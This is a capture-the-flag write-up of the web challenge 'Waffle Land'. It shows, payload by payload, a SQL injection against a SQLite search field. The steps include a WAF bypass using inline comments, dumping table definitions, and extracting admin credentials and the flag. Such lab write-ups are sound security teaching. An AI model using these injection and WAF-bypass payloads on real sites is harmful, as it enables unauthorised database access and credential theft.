---
layout: post
title: "Waffle Land"
author: "shreyas-sriram"
tags: ['Web']
---

We got hacked, but our waffles are now safe after we mitigated the vulnerability.

Connect here:
[http://jh2i.com:50024](http://jh2i.com:50024)

## Solution
* Exploring the page, we find that it is mostly static except for the `Search` and `Signin` functionality
* Checking for SQL Injection (SQLi) in both, we find that the `Search` functionality is vulnerable to SQLi
* SQLi can be detected by entering input as `'`<br/>

**Payload**</br>
```
'
```

**Response**</br>
```
Bad Request
(sqlite3.OperationalError) unrecognized token: "'"
[SQL: select * from product where name like '%'%']
(Background on this error at: http://sqlalche.me/e/13/e3q8)
```

* It can be seen that `sqlite` is used as database
* All we have to do is inject and obtain data<br/>

**SQL Injection Exploitation Steps**</br>
1. Detect vulnerability :
	* already done
2. Find type of injection :
	* we know the response is gotten back
3. Find number of columns returned :
	1. Use `ORDER BY <column-number>`
	2. `--;` is used to end the SQL statement<br/>

**Payload**</br>
```
' ORDER BY 10 --;
````

**Response**</br>
```
Bad Request
(sqlite3.OperationalError) 1st ORDER BY term out of range - should be between 1 and 5
[SQL: select * from product where name like '%' ORDER BY 10 --;%']
(Background on this error at: http://sqlalche.me/e/13/e3q8)
```

4. Find the injectable columns :
	1. Use `UNION SELECT 1,2,3,4,..,x`
	2. In this case, we get `403 Forbidden`
	3. Probably there is a WAF (Web Application Firewall) checking inputs, this needs to be bypassed
	4. Using SQL comments found [here](https://incogbyte.github.io/sqli_waf_bypass/), we can bypass the WAF
	5. From the response image below, we see that `columns 2, 3, 4` are injectable

**Payload**</br>
```
'/**/UNION/**/SELECT/**/1,2,3,4,5 --;
````

**Response**</br>
![alt-text]({{site.baseurl}}/assets/Waffle-Land/vuln-cols.png)

5. Exploit the columns to extract data :
	1. Use `sql FROM sqlite_master` to get the `TABLE definitions`
	2. We get two TABLES - `product` and `user`
	3. `TABLE user` is what we are interested in<br/>

**Payload**</br>
```
'/**/UNION/**/SELECT/**/1,sql,3,4,5 FROM sqlite_master --;
```

**Response**</br>
```
CREATE TABLE product (
	id INTEGER NOT NULL, 
	name VARCHAR(40), 
	description VARCHAR(500), 
	prize VARCHAR(10), 
	image VARCHAR(50), 
	PRIMARY KEY (id), 
	UNIQUE (name)
)

CREATE TABLE user (
	id INTEGER NOT NULL, 
	username VARCHAR(40), 
	password VARCHAR(40), 
	PRIMARY KEY (id), 
	UNIQUE (username)
)
```

6. Extract data from TABLE :
	1. Use `<column-names> FROM <table-names>`<br/>
	
**Payload**</br>
```
'/**/UNION/**/SELECT/**/1,username,password,4,5 FROM user --;
```

**Response**</br>
```
admin
$4
NT7b#ed4$J?eZ#m_
```

* Use the obtained username and password in `Signin` to get the flag

## Flag
```
flag{check_your_WAF_rules}
```